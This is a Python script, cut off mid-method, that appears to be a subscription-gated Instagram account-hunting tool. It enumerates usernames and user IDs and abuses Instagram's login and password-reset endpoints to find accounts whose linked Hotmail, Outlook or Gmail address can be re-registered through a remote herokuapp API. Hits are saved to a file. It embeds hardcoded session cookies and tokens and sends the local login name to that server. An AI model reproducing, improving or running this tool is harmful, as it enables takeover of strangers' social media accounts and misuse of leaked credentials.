import requests 
import time
import threading
import random
import os
import uuid
import sys
import json
from user_agent import generate_user_agent

uuid =str(os.getlogin())

id1 = "-".join(uuid)
#print(f"ID : {id1}")

listcookies =['12']
#print(f'ID : {id1}\nTelegram : @BBMZZ')
time.sleep(1.1)
os.system('clear')
class Checker:
    def __init__(self) :
        self.idf = id1
        self.a = 0
        self.rcol = '1234567'
        self.b = 0
        self.f = 0
        self.s = 0
        self.n = 0
        self.ei =0
        self.j = 0
        self.r = 0
        self.listnumber = '1234567890'
        self.numberchoice = str(''.join(random.choice(self.listnumber)for i in range(6)))
        self.whil = True 
        self.e = 0
        self.u = 0
        self.o = 0
        self.k = 0
        self.num = 0
        self.telegram = "@BBMZZ"
        self.nt = "Connection Error "
        self.colr = str(''.join(random.choice(self.rcol) for i in range(1)))
        
        #print(self.numberchoice)
   
        print(f"\033[1;3{self.colr}m[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [ Call ] (Acctive) \n[5] - Gmail [new]\n[6] - Username 2010 - 2011 [new]\n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n[!] - Version Tool 0.6")
        self.un = input("[=] - Enter Your Number list : ")
        if self.un =="1":
            os.system('clear')
            self.choi = "[1] - Checker Hotmail APi Zaid\n[2] - Checker Hotmail Api Instagram\n[!] - No saved Info username in hit "
            print(self.choi)
            self.ux = input('[=] - Enter Your Number 1 or 2 : ')
            if self.ux =='1':
                os.system('clear')
                self.hotmail()
            elif self.ux == "2":
                os.system('clear')
                self.hotmail1()

            else:
                os.system('clear')
                self.erp = "Error Number in list "
                print(self.erp)
                sys.exit()
        elif self.un =="2":
            os.system('clear')
            self.outlook()
        elif self.un =="3":
            os.system('clear')
            self.ran()
        elif self.un=="4":
            os.system('clear')
            self.cko = '[1] - Hotmail and Outlook\n[2] - Gmail and Hotmail and Outllok'
            print(self.cko)
            self.t6 = input("[=] - Enter Your Choice 1 or 2 : ")
            if self.t6 == 1 or "1":

                self.filecalll()
            elif self.t6 == "2" or 2 :
                self.filecall()

            #self.me ="This option is in maintenance mode .".upper()
            #print(self.me)
            #sys.exit()
        elif self.un == "5":
            try:

                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/bagyay/{self.idf}').text
                print(self.url)
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    sys.exit()
                else:
                    os.system('clear')
                    self.fir = input("[=] - Enter Your Name File : ")
                    try:
                        self.firr = open(self.fir,'r').read().splitlines()
                        self.gmail()
                    except FileNotFoundError as error:
                        os.system('clear')
                        self.erf = "The File No in Phone ."
                        print(self.erf)
                        sys.exit()
            except requests.exceptions.ConnectionError as error:
                print(self.nt)
                sys.exit()
                pass



        elif self.un == "6":
            try:

                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/akiiahhhha/{self.idf}').text
                print(self.url)
            except requests.exceptions.ConnectionError as error:
                print(self.nt)
                sys.exit()
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            else:
                os.system('clear')
                self.py = "[1] - Username 2010\n[2] - Username 2011\n[3] - Username 2012"
                print(self.py)
                try :
                    self.iny = int(input("[=] - Enter Your Number List  : "))
                    if self.iny ==1:
                        os.system('clear')
                        self.number1 = 6
                   
                        self.username()
                    elif self.iny ==2:
                        os.system('clear')
                        self.number1 = 7
              
                        self.username()
                    elif self.iny == 3:
                        os.system('clear')
                        self.number1 = 8
                       
                        self.username()
                    else:
                        self.emn ="Choose an error."
                        print(self.emn)
                        sys.exit()
                except ValueError as error1:
                    os.system('clear')
                    self.rt = f"Error Choice : {self.iny}"
                    print(self.rt)
                    sys.exit()
    def gmail(self):
        try:

            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/uuyqyyq/{self.idf}').text
            print(self.url)
        except requests.exceptions.ConnectionError as error:
            print(self.nt)
            sys.exit()
        if ('"Subscription":"inactive"') in self.url:
            os.system("clear")
            self.pcs ='No acctive id'
            print(self.pcs)
            exit()
        for self.ra in self.firr:
            try:

                self.urli = requests.get(f"https://api-m-525f11315c3c.herokuapp.com/api/instagram/zaid.k.k/{self.ra}").text
                if ('"status": "OK",') in self.urli:
                    self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/{self.ra}/{self.idf}').text
                    if ('"status":"bad"') in self.url:
                        self.k +=1
                        os.system('clear')
                        print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
                    elif ('"status":"Ok"') in self.url:
                        self.a+=1
                        os.system('clear')
                        print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
                        with open('acctive.txt','a') as self.fe:
                            self.fe.write(f'{self.ra}\n')
                else:
                    self.b+=1
                    os.system('clear')
                    print(f'I.G | {self.a} | I.B | {self.b} | G.B | {self.k} | Telegram | @{self.telegram}')
            except requests.exceptions.ConnectionError as error:
                continue
    def hotmail1(self):
        os.system('clear')
        self.fil = input("[=] - Enter Your Name File : ")
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.email in self.ope:
            url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

            head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
            
                    'user-agent': '{}'.format(generate_user_agent()),
                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1007230059',
                    'x-requested-with': 'XMLHttpRequest'
            }
            tim = str(time.time()).split('.')[0]
            data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj1212',
                'username': f'{self.email}@hotmail.com',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            try:
                try:
                    
                    rf = requests.post(url,headers=head1,data=data).text
                except requests.exceptions.ReadTimeout as error:
                    continue
                
            except requests.exceptions.ConnectionError as error:
                continue
         
            if ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
                self.u+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')
            elif ('"Sorry, there was a problem with your request.') in rf:
                self.ei+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')
            elif ('"user":true,') in rf:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.email}/{self.idf}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@hotmail.com\n')
                else:
                    self.s+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | E.I | {self.ei}| Telegram | {self.telegram} |')




    def username(self):
        global listcookies
        os.system('clear')
        self.listnum ="1234567890"
        
        self.lc = random.choice(listcookies)
        
        print(self.lc)
        time.sleep(2)
        while self.whil :
            self.ro = str(''.join(random.choice(self.numberchoice) for i in range(6)))
            
            url = f'http://i.instagram.com/api/v1/users/{self.ro}/info/'
            headers = {
            'Host': 'i.instagram.com',
            "Cookie":f"mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={self.lc}",
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
            'Accept-Language': 'en-IQ, en-US',
            'X-IG-Connection-Type': 'MOBILE(LTE)',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
            }
            try:

                rr = requests.get(url,headers=headers).text
            except requests.exceptions.ConnectionError as error:
                continue
            try:
                if 'User not found' in rr:
                    self.iderr = "Tihe ID Error"
                    continue
                else:
                    self.rspo=json.loads(rr)
                    self.user = self.rspo['user']['username']
                    with open('2010.txt','a') as self.izz :
                        self.izz.write(f'{self.user}\n')
                    print(self.user)
                    

            except KeyError as error:
                os.system('clear')
                
                self.pi = "is blook in url - using sessoin id \nWould you like to use Sessionid ? [Y - N]."
                print(self.pi)
                self.ui = input('[=] - Choice : ').lower()
                if self.ui =="y":
                    os.system('clear')
                    self.cookie = input("[=] - Sessoinid : ")
                
                        
                    lc = listcookies.remove('12')
                    print(lc)
                    time.sleep(2)

                    listcookies.append(self.cookie)
                    self.username()
                        
                    
                    
                 
                elif self.ui =="n":
                    os.system('clear')
                    self.end = "The tool has been closed."
                    print(self.end)
                    sys.exit()
                else:
                    self.emn ="Choose an error."


                    print(self.emn)
                    sys.exit()
                break
    def filecalll(self):
        self.fil1 = input("[=] - Enter Your Name File : ")
        try:
            self.ixx = open(self.fil1,"r").read().splitlines()
            threading.Thread(target=self.calll).start()
            #threading.Thread(target=self.out).start()
        except FileNotFoundError as error:
            self.fo = "The Name File Error in Phone .!".upper()
            sys.exit()
    def filecall(self):
        self.fil1 = input("[=] - Enter Your Name File : ")
        try:
            self.ix = open(self.fil1,"r").read().splitlines()
            threading.Thread(target=self.call).start()
            #threading.Thread(target=self.out).start()
        except FileNotFoundError as error:
            self.fo = "The Name File Error in Phone .!".upper()
            sys.exit()
    def calll(self):
        self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/susudjidod/{self.idf}').text
        print(self.url)
        if ('"Subscription":"inactive"') in self.url:
            os.system("clear")
            self.pcs ='No acctive id'
            print(self.pcs)
            exit()
        else:

            for self.email in self.ixx:
                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.email}/{self.idf}').text
                if ('"OK"') in self.url:
                   
                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.email}/{self.idf}').json()['status']
                    if self.url2=='ok':
                      
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@hotmail.com\n')
                        os.system('clear')
                        self.a+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')

                    else:
                        os.system('clear')
                        self.b+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')
                else:
                    os.system('clear')
                    self.e+=1
                    print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')
                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.email}/{self.idf}').text
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    exit()
                elif ('"OK"') in self.url:
                    self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.email}/{self.idf}').json()['status']
                    if self.url3=='ok':
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@outlook.com\n')
                        os.system('clear')
                        self.n+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')

                    else:
                        os.system('clear')
                        self.r+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')
                
                else:
                    os.system('clear')
                    self.o+=1
                    print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| TeleGram | {self.telegram} |')
                
    def call(self):
        self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/susudjidod/{self.idf}').text
        print(self.url)
        if ('"Subscription":"inactive"') in self.url:
            os.system("clear")
            self.pcs ='No acctive id'
            print(self.pcs)
            exit()
        else:

            for self.email in self.ix:
                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.email}/{self.idf}').text
                if ('"OK"') in self.url:
                   
                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.email}/{self.idf}').json()['status']
                    if self.url2=='ok':
                      
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@hotmail.com\n')
                        os.system('clear')
                        self.a+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')

                    else:
                        os.system('clear')
                        self.b+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                else:
                    os.system('clear')
                    self.e+=1
                    print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.email}/{self.idf}').text
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    exit()
                elif ('"OK"') in self.url:
                    self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.email}/{self.idf}').json()['status']
                    if self.url3=='ok':
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@outlook.com\n')
                        os.system('clear')
                        self.n+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')

                    else:
                        os.system('clear')
                        self.r+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                
                else:
                    os.system('clear')
                    self.o+=1
                    print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                
                
                
                self.urli = requests.get(f"https://api-m-525f11315c3c.herokuapp.com/api/instagram/zaid.k.k/{self.email}").text
                if ('"status": "OK",') in self.urli:
                    self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api1/gmail/BBMZZ/v1/G-1/{self.email}/{self.idf}').text
                    if ('"status":"bad"') in self.url:
                        os.system('clear')
                        self.u+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')

                    elif ('"status":"Ok"') in self.url:
                      
                      
                        with open('acctive.txt','a') as self.fe:
                            self.fe.write(f'{self.ra}\n')
                        os.system('clear')
                        self.f+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                    else:
                        os.system('clear')
                        self.u+=1
                        print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')
                else:
                    os.system('clear')
                    self.k+=1
                    print(f'| HIT H | {self.a} | BAD H | {self.b} | BAD I | {self.e} | \n| HIT O | {self.n} | BAD O | {self.r} | BAD I | {self.o} | \n| HIT G | {self.f} | BAD G | {self.u} | BAD I | {self.k} |\n| TeleGram | {self.telegram} |')



    def ho1(self):
        for self.ra in self.ix:
            try:

                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
                print(self.url)
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    exit()
                if ('"OK"') in self.url:
                    self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']

                    if self.url2=='ok':
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@hotmail.com\n')
                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                        head2={
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                            'sec-ch-prefers-color-scheme': 'light',
                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                            'viewport-width': '917',
                            'x-asbd-id': '198387',
                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                            'x-instagram-ajax': '1006627630',
                            'x-requested-with': 'XMLHttpRequest'
                        }
                        try:
                            ge = requests.get(url2,headers=head2).json()
                            id = ge['data']['user']['id']
                            headers1 = {
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                }
                            data3 = {
                                'ig_sig_key_version': '4',
                                "user_id":id
                            }
                            try:
                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                try:
                                    rs =str(res['obfuscated_email'])
                                    print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                    time.sleep(2)
                                except KeyError as error:
                                    print('error')
                            except requests.exceptions.ConnectionError as error:
                                continue
                        except requests.exceptions.ConnectionError as error:
                            continue
                        self.a+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                    else:
                        self.s+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.u+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            except requests.exceptions.ConnectionError as error:
                continue
        print("Complete File .")
    def out(self):
        for self.ra in self.ix:
            try:

                self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
                if ('"Subscription":"inactive"') in self.url:
                    os.system("clear")
                    self.pcs ='No acctive id'
                    print(self.pcs)
                    exit()
         
          
    






                elif ('"OK"') in self.url:
                    self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
                    if self.url3=='ok':
                        with open(f'acctive.txt','a') as f0:
                            f0.write(f'{self.ra}@outlook.com\n')
                        url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                        head2={
                            'accept': '*/*',
                            'accept-encoding': 'gzip, deflate, br',
                            'accept-language': 'en-US,en;q=0.9',
                            'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                            'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                            'sec-ch-prefers-color-scheme': 'light',
                            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                            'viewport-width': '917',
                            'x-asbd-id': '198387',
                            'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                            'x-instagram-ajax': '1006627630',
                            'x-requested-with': 'XMLHttpRequest'
                        }
                        try:
                            ge = requests.get(url2,headers=head2).json()
                            id = ge['data']['user']['id']
                            headers1 = {
                                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                    'viewport-width': '917',
                                    'x-asbd-id': '198387',
                                    'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                                }
                            data3 = {
                                'ig_sig_key_version': '4',
                                "user_id":id
                            }
                            try:
                                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                                try:
                                    rs =str(res['obfuscated_email'])
                                    print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                    time.sleep(2)
                                except KeyError as error:
                                    print('error')
                            except requests.exceptions.ConnectionError as error:
                                continue
                        except requests.exceptions.ConnectionError as error:
                            continue
                        self.f+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                    else:
                        self.k+=1
                        os.system('cls' if os.name=='nt'else"clear")
                        print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.e+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            except requests.exceptions.ConnectionError as error:
                continue
        
        print("Complete File .")
        
    def ran(self):
        self.list='qwertyuioplkjhgfdsazxcvvbnm'
        try : 
            self.nmb = int(input("[=] - Enter Your Number Random ? 6...10 : ").upper())
            if self.nmb >5 or self.nmb <11:
                self.number()
              
            elif self.nmb >11:
                self.er1 = "The number is very large.".upper()
                print(self.er1)
                sys.exit()
        except ValueError as error:
            self.er = "Alphabet letters cannot be used".upper()
            print(self.er)
            sys.exit()
    def number(self):
        while True :
            self.rand = str(''.join(random.choice(self.list) for i in range(self.nmb)))
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.rand}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url: 
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            elif ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.rand}/{self.idf}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.rand}@hotmail.com\n')
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')



            
    
    def outlook(self):
        self.fil = input("[=] - Enter Your Name File : ".upper())
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            elif ('"OK"') in self.url:
